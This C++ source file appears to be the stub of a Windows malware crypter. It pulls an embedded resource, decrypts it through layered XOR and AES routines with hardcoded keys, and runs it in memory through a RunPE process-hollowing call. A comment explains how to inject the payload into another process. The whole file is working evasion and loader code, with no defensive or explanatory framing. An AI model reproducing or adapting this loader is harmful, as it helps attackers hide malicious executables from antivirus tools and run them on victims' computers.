#include <iostream>
#include <Windows.h>
#include <fstream>
#include "Runpe.h"
#include <vector>
#include <string>
#include "VirtualAES.h"
#include <cstddef>
#include "huffman.h"

using namespace std;


int Rsize;
//char* RData;


//void Resource(int id)
//{
//	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(1), RT_RCDATA);
//	HGLOBAL temp = LoadResource(NULL, hResource);
//	Rsize = SizeofResource(NULL, hResource);
//	RData = (char*)LockResource(temp);
//}


//void enc()
//{
//	switch (RData[strlen(RData) - 1])
//	{
//	case '1':
//		{
//			}
//		break;
//	case '2':
//		{
//			string cipher = "penguin";
//			for (unsigned x = 0; x < Rsize; x++)           // Steps through the characters of the string.
//				RData[x] ^= cipher[x % cipher.size()];
//			//for (int i = 0; i < Rsize; i++)       
//			//	{
//			//		out << RData[i]; // ^= cipher[i % strlen(cipher)];
//			//	}
//
//			//	char cipher[] = "penguin";
//			//ofstream out("Stub Output.txt");
//			//	for (int i = 0; i < Rsize; i++)       
//			//	{
//			//		out << RData[i]; // ^= cipher[i % strlen(cipher)];
//			//	}
//			}												// Simple Xor chiper
//		break;
//	case '3':
//		{	std::ofstream out("3.txt");
//		out << strlen(RData) - 1;
//		char cipher[] = "test";
//		unsigned short pl = strlen(cipher);
//		char passTable[1024];
//		for (int i = 0; i != 1024; ++i)
//			passTable[i] = cipher[i%pl];
//
//		for (unsigned long long i = 0; i != Rsize; i += 2)
//		{
//			out << RData[i];
//			RData[i] ^= passTable[i % 1024];
//		}
//
//			}
//		break;
//	}
//	return;
//}


std::vector<char> RData;

//Variables para AES
enum { SUCCESS, FAIL, MAX_LEN = 16 };
unsigned char key[] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f }; //key example
unsigned int plainLen = 16 * sizeof(unsigned char);  //bytes in plaintext
unsigned int outLen = 0;  // out param - bytes in ?iphertext
unsigned char* c = new unsigned char[plainLen];
std::vector<char> file_data2;

void Resource(int id)
{
	size_t Rsize;

	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(id), RT_RCDATA);
	HGLOBAL temp = LoadResource(NULL, hResource);
	Rsize = SizeofResource(NULL, hResource);
	RData.resize(Rsize);
	memcpy((void*)RData.data(), temp, Rsize);  // replace &RData[0] with RData.data() if C++11
}

void xor_crypt(const std::string &key, std::vector<char> &data)
{
	for (size_t i = 0; i != data.size(); i++)
		data[i] ^= key[i % key.size()];
}

void AESDecrypt(std::vector<char> toDecrypt, int size)
{
	//Explanation exist in Builder
	unsigned char key[KEY_256] = "S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>";

	unsigned char ciphertext[BLOCK_SIZE];
	unsigned char decrypted[BLOCK_SIZE];

	aes_ctx_t* ctx;
	virtualAES::initialize();
	ctx = virtualAES::allocatectx(key, sizeof(key));

	int count = 0;
	int index = size / 16;
	int innerCount = 0;
	int innerIndex = 16;
	int dataCount = 0;
	int copyCount = 0;
	for (count; count < index; count++)
	{
		for (innerCount = 0; innerCount < innerIndex; innerCount++)
		{
			ciphertext[innerCount] = toDecrypt[dataCount];
			dataCount++;
		}

		virtualAES::decrypt(ctx, ciphertext, decrypted);

		for (innerCount = 0; innerCount < innerIndex; innerCount++)
		{
			toDecrypt[copyCount] = decrypted[innerCount];
			copyCount++;
		}
	}

	delete ctx;
}

void descompresionHuffman( std::vector<char> toDecrypt)
{
	//HuffmanCompressor(argv[2]).decompress(argv[3]);
	//HuffmanCompressor("").decompress(toDecrypt);
}

void enc()
{
	switch (RData.back())
	{
	case '1':
		{
			std::ofstream out("1.txt");
		}
		break;
	case '2':
		{
			xor_crypt("penguin", RData);
			//AES_decrypt(RData);
		}
		break;
	case '3':
		{
			AESDecrypt(RData, RData.size());
		}
		break;
	case '4':
		{
			AESDecrypt(RData, RData.size());
			xor_crypt("penguin", RData);
			
		}
		break;
	case '5':
	{
			xor_crypt("penguin", RData);
			AESDecrypt(RData, RData.size());
	}
		break;
	case '6':
	{
		//descompresionHuffman(RData);
		xor_crypt("Qwe,.-123%&/()", RData); //Encrypt it
		AESDecrypt(RData, RData.size());
		xor_crypt("elephant", RData); //Encrypt it
		AESDecrypt(RData, RData.size());
		xor_crypt("penguin", RData); //Encrypt it
		
	}
	break;
	}
	return;
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{

	Resource(10);
	enc();

	LPVOID pFile;
	TCHAR szFilePath[1024];

	pFile = RData.data();
	if (pFile)
	{
		GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
		//replace process.exe with "szFilePath" if you want to inject it in the SAME file.
		//or you may write the file path you want to inject in.
		ExecFile(LPSTR(szFilePath), pFile);
	}
	return 0;
};